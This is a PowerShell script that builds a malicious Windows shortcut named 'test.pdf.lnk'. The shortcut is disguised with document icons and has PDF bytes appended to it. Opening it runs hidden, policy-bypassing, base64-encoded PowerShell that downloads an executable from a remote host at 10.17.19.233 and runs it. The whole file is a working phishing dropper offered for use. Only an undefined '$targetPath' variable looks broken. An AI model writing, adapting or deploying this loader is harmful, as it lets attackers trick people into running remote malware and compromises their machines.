
# Define paths and arguments for the new LNK file
$powershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$script = @'
Invoke-WebRequest -Uri 'http://10.17.19.233:8000/dist/exe.exe' -OutFile "$env:TEMP\exe.exe"
Start-Process "$env:TEMP\exe.exe"
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
$scriptDirectory = $PWD
$lnkPath = [System.IO.Path]::Combine($scriptDirectory, "test.pdf.lnk")
$arguments = "-NoP -Ex Bypass -WindowStyle Hidden -Enc $encoded"

# Create and configure the shortcut
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)
$shortcut.TargetPath = $powershellPath
$shortcut.Arguments = $arguments
$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($powershellPath)
$shortcut.Save()

$iconLocations = @(
    "imageres.dll,67",
    "shell32.dll,77",
    "%SystemRoot%\System32\imageres.dll,67",
    "%SystemRoot%\System32\shell32.dll,77",
    "shell32.dll,1"
)

foreach ($location in $iconLocations) {
    $shortcut.IconLocation = $location
    try {
        $shortcut.Save()
        $shortcut.TargetPath = $targetPath
        $shortcut.Save()
        Write-Host "Shortcut created successfully with icon: $location"
        break
    } catch {
        Write-Host "Failed to set icon: $location"
        Continue
    }
}

# Create dummy PDF content
$dummyPDFContent = @"
%PDF-1.5
%¿÷¢þ
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
%%EOF
"@

# Save the dummy PDF content to a file
$dummyPDFPath = "$PWD\dummy.pdf"
Set-Content -Path $dummyPDFPath -Value $dummyPDFContent -Encoding Ascii

# Embed the PDF content into the LNK file
$pdfContent = [System.IO.File]::ReadAllBytes($dummyPDFPath)
$stream = [System.IO.File]::Open($lnkPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
$stream.Seek(0, [System.IO.SeekOrigin]::End)
$stream.Write($pdfContent, 0, $pdfContent.Length)
$stream.Close()

Write-Host "PDF content embedded into LNK file 'test.pdf.lnk'."


# 아이콘 캐시 새로고침 (관리자 권한 필요)
Start-Process "ie4uinit.exe" -ArgumentList "-show" -Wait

Write-Host "Shortcut creation and icon cache refresh completed."

# Clean up the dummy PDF file
Remove-Item -Path $dummyPDFPath -Force